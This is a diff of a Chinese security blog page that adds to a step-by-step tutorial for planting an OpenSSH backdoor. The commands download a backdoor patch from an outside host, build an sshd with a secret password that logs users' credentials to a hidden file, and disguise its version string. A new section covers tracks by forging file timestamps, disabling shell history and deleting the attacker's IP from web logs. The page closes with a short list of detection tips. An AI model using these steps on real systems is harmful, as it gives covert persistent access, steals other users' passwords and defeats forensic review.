@@ -261,7 +261,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">704</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">1,103</span> / Reading time: <span class="post-count">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -411,17 +411,34 @@ height:50vh;
 <p>　　　　3、客户端请求连接服务器，服务器将一个随机字符串发送给客户端</p>
 <p>　　　　4、客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</p>
 <p>　　　　5、服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</p>
-<h1 id="OpenSSH-后门"><a href="#OpenSSH-后门" class="headerlink" title="OpenSSH 后门"></a>OpenSSH 后门</h1><p>查看Openssh版本<br><code>ssh -V</code><br><img src="/ssh/2.png" alt="2"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr ~]# mkdir open_ssh_backdoor</span><br><span class="line">[root@vultr ~]# cd open_ssh_backdoor/</span><br><span class="line">[root@vultr open_ssh_backdoor]# wget http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# wget http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# tar -zvxf openssh-5.9p1.patch.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# tar -zvxf openssh-5.9p1.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/</span><br><span class="line">[root@vultr open_ssh_backdoor]# cd openssh-5.9p1</span><br><span class="line">[root@vultr openssh-5.9p1]# patch &lt; sshbd5.9p1.diff </span><br><span class="line">[root@vultr openssh-5.9p1]# vim includes.h</span><br></pre></td></tr></table></figure>
-<p>在最底下可以看见<br><img src="/ssh/1.png" alt="1"></p>
+<h1 id="OpenSSH-后门"><a href="#OpenSSH-后门" class="headerlink" title="OpenSSH 后门"></a>OpenSSH 后门</h1><h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>Centos 7</p>
+<h2 id="查看Openssh版本"><a href="#查看Openssh版本" class="headerlink" title="查看Openssh版本"></a>查看Openssh版本</h2><p><code>ssh -V</code><br><img src="/ssh/2.png" alt="2"></p>
+<h2 id="下载SSH配置文件"><a href="#下载SSH配置文件" class="headerlink" title="下载SSH配置文件"></a>下载SSH配置文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr ~]# mkdir open_ssh_backdoor</span><br><span class="line">[root@vultr ~]# cd open_ssh_backdoor/</span><br><span class="line">[root@vultr open_ssh_backdoor]# wget http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# wget http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# tar -zvxf openssh-5.9p1.patch.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# tar -zvxf openssh-5.9p1.tar.gz</span><br><span class="line">[root@vultr open_ssh_backdoor]# cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/</span><br><span class="line">[root@vultr open_ssh_backdoor]# cd openssh-5.9p1</span><br><span class="line">[root@vultr openssh-5.9p1]# patch &lt; sshbd5.9p1.diff</span><br></pre></td></tr></table></figure>
+<p>可能会遇到patch未安装</p>
+<p><code>yum -y install patch</code></p>
+<h2 id="修改后门密码与文件记录"><a href="#修改后门密码与文件记录" class="headerlink" title="修改后门密码与文件记录"></a>修改后门密码与文件记录</h2><p><code>[root@vultr openssh-5.9p1]# vim includes.h</code><br>在最下面可以看见<br><img src="/ssh/1.png" alt="1"></p>
+<p>ILOG是记录登录到本机的用户名和密码的文件，这里我用.ilog是为了隐藏文件，需要用<code>ls -la</code>才能查看<br>OLOG是记录本机登录到远程的用户名和密码<br>SECRETPW是你后门的密码。</p>
 <p><code>[root@vultr openssh-5.9p1]# vim version.h</code></p>
 <p>修改ssh版本信息，改成原来的</p>
 <p><img src="/ssh/3.png" alt="3"></p>
 <h2 id="安装所需环境"><a href="#安装所需环境" class="headerlink" title="安装所需环境"></a>安装所需环境</h2><p><code>[root@vultr openssh-5.9p1]# yum install -y openssl openssl-devel pam-devel</code></p>
 <h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr openssh-5.9p1]# ./configure --prefix=/usr --sysconfdir=/etc/ssh</span><br><span class="line">[root@vultr openssh-5.9p1]# make &amp;&amp; make install</span><br><span class="line">[root@vultr openssh-5.9p1]# service sshd restart</span><br></pre></td></tr></table></figure>
-<p>(不知道哪一步出错了 中途直接ssh崩了 甚至连vps都连不上了。。。心态爆炸)</p>
+<p>(不知道哪一步出错了 中途直接ssh崩了 vps都连不上了。。。心态爆炸)</p>
 <p>然后就可以用之前的密码登陆了<br><img src="/ssh/4.png" alt="4"></p>
 <p>可以发现 只会记录正常的密码，而我们的后门密码不会记录<br><img src="/ssh/5.png" alt="5"></p>
+<h2 id="抹去痕迹"><a href="#抹去痕迹" class="headerlink" title="抹去痕迹"></a>抹去痕迹</h2><h3 id="修改上传文件时间戳"><a href="#修改上传文件时间戳" class="headerlink" title="修改上传文件时间戳"></a>修改上传文件时间戳</h3><p>恢复新配置文件的日期，使其与旧文件的日期一致，对ssh_config和sshd_config文件的内 容进行对比，使其配置文件一致，然后修改文件日期。</p>
+<p>touch -r 老文件时间戳 新文件时间戳</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr openssh-5.9p1]# touch -r /etc/ssh/ssh_config.bak /etc/ssh/ssh_config</span><br><span class="line">[root@vultr openssh-5.9p1]# touch -r /etc/ssh/sshd_config.bak /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+<h3 id="清除操作日志"><a href="#清除操作日志" class="headerlink" title="清除操作日志"></a>清除操作日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr open_ssh_backdoor]# export HISTFILE=/dev/null</span><br><span class="line">[root@vultr open_ssh_backdoor]# xport HISTSIZE=0</span><br><span class="line">[root@vultr open_ssh_backdoor]# cd /etc/httpd/logs/</span><br><span class="line">[root@vultr open_ssh_backdoor]# sed -i &apos;/192.168.52.175/d&apos; access_log*    //your login IP</span><br><span class="line">[root@vultr open_ssh_backdoor]# echo &gt;/root/.bash_history //清空操作日志</span><br></pre></td></tr></table></figure>
+<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><ul>
+<li>重装openssh，更新到最新版本</li>
+<li>将SSH默认登录端口22改为其他端口</li>
+<li>IPTable中添加SSH访问策略</li>
+<li>查看ssh配置文件和/usr/sbin/sshd的时间<br><code>stat /usr/sbin/sshd</code></li>
+<li>查看安全日志<br><code>[root@vultr open_ssh_backdoor]# more /var/log/secure |grep Accepted  //排查ip</code></li>
+<li>通过strace监控sshd进程读写文件的操作<br>一般的sshd后门都会将账户密码记录到文件，可以通过strace进程跟踪到ssh登录密码文件。</li>
+</ul>
+<p>参考链接 <a href="http://www.91ri.org/7295.html" target="_blank" rel="noopener">http://www.91ri.org/7295.html</a> 【利用strace找出ssh后门】</p>
 
     </article>
     <!-- license  -->
@@ -575,7 +592,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh公钥免密"><span class="toc-number">1.</span> <span class="toc-text">ssh公钥免密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码口令登录"><span class="toc-number">1.1.1.</span> <span class="toc-text">密码口令登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#公钥登录"><span class="toc-number">1.1.2.</span> <span class="toc-text">公钥登录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenSSH-后门"><span class="toc-number">2.</span> <span class="toc-text">OpenSSH 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装所需环境"><span class="toc-number">2.1.</span> <span class="toc-text">安装所需环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译安装"><span class="toc-number">2.2.</span> <span class="toc-text">编译安装</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh公钥免密"><span class="toc-number">1.</span> <span class="toc-text">ssh公钥免密</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#密码口令登录"><span class="toc-number">1.1.1.</span> <span class="toc-text">密码口令登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#公钥登录"><span class="toc-number">1.1.2.</span> <span class="toc-text">公钥登录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OpenSSH-后门"><span class="toc-number">2.</span> <span class="toc-text">OpenSSH 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境说明"><span class="toc-number">2.1.</span> <span class="toc-text">环境说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#查看Openssh版本"><span class="toc-number">2.2.</span> <span class="toc-text">查看Openssh版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#下载SSH配置文件"><span class="toc-number">2.3.</span> <span class="toc-text">下载SSH配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修改后门密码与文件记录"><span class="toc-number">2.4.</span> <span class="toc-text">修改后门密码与文件记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装所需环境"><span class="toc-number">2.5.</span> <span class="toc-text">安装所需环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译安装"><span class="toc-number">2.6.</span> <span class="toc-text">编译安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#抹去痕迹"><span class="toc-number">2.7.</span> <span class="toc-text">抹去痕迹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#修改上传文件时间戳"><span class="toc-number">2.7.1.</span> <span class="toc-text">修改上传文件时间戳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#清除操作日志"><span class="toc-number">2.7.2.</span> <span class="toc-text">清除操作日志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何防御"><span class="toc-number">2.8.</span> <span class="toc-text">如何防御</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -588,6 +605,16 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1238,7 +1265,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
         </li>
     
     
@@ -1256,8 +1283,59 @@ top:50vh;
         </li>
     
     
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
         <li class="archive-post-item">
             <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2018/04/10/1个月学习计划/" >1个月学习计划</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/17/JAVA学习情况/" >java学习笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
         </li>
     
     
@@ -1299,20 +1377,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/23/Hooskcms/" >Hooskcms 几个小洞</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/04/18/Broad Crawls~Benchmarking/" >[Untitled Post]</a>
         </li>
     
@@ -1327,7 +1391,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/17/JAVA学习情况/" >java学习笔记</a>
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/php-security-calendar-2017/" >php-security-calendar-2017</a>
         </li>
     
     
@@ -1348,43 +1412,6 @@ top:50vh;
         <li class="archive-post-item">
             <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2018/03/23/VehicleWorkshop/" >VehicleWorkshop上传漏洞本地复现</a>
         </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/28/cookie与session/" >cookie与session的笔记</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> Invalid date </div>
-    <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/08/25/eyou前台getshell/" >eyoucms前台getshell复现</a>
-        </li>
-    
-    
-    
-    
-    
-        </ul>
-    
-    <div class="archive-year"> 2018 </div>
-    <ul class="year-list">
     
     
         <li class="archive-post-item">
@@ -1438,17 +1465,15 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="渗透测试"><span class="iconfont-archer">&#xe60a;</span>渗透测试</span>
     
-        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
-    
         <span class="sidebar-category-name" data-categories="学习笔记"><span class="iconfont-archer">&#xe60a;</span>学习笔记</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
     
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
-        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
-    
         <span class="sidebar-category-name" data-categories="sql注入"><span class="iconfont-archer">&#xe60a;</span>sql注入</span>
     
-        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
+        <span class="sidebar-category-name" data-categories="Arbitrary-File-Upload"><span class="iconfont-archer">&#xe60a;</span>Arbitrary-File-Upload</span>
     
         <span class="sidebar-category-name" data-categories="http协议"><span class="iconfont-archer">&#xe60a;</span>http协议</span>
     
@@ -1456,15 +1481,17 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
     
+        <span class="sidebar-category-name" data-categories="write-up"><span class="iconfont-archer">&#xe60a;</span>write-up</span>
+    
         <span class="sidebar-category-name" data-categories="python"><span class="iconfont-archer">&#xe60a;</span>python</span>
     
         <span class="sidebar-category-name" data-categories="php反序列化"><span class="iconfont-archer">&#xe60a;</span>php反序列化</span>
     
         <span class="sidebar-category-name" data-categories="scrapy"><span class="iconfont-archer">&#xe60a;</span>scrapy</span>
     
-        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
-    
         <span class="sidebar-category-name" data-categories="代码执行"><span class="iconfont-archer">&#xe60a;</span>代码执行</span>
+    
+        <span class="sidebar-category-name" data-categories="xxe"><span class="iconfont-archer">&#xe60a;</span>xxe</span>
     
         <span class="sidebar-category-name" data-categories="内网"><span class="iconfont-archer">&#xe60a;</span>内网</span>
     
